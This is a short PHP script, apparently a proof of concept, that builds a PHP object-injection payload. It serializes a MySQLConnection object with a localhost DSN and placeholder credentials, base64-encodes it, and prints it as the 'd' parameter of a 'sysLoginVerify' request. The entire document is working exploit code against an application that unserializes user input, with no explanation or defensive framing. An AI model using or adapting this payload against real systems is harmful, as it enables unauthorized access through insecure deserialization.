<?php
class MySQLConnection {
    protected $dsn = [
    	"hostspec" => '127.0.0.1',
    	"username" => 'whatever',
    	"password" => 'whatever',
    	"database" => 'whatever',
    	"encoding" => 'whatever',
    ];
    protected $flags = false;
}

echo("sysLoginVerify?d=".base64_encode(serialize(new MySQLConnection)));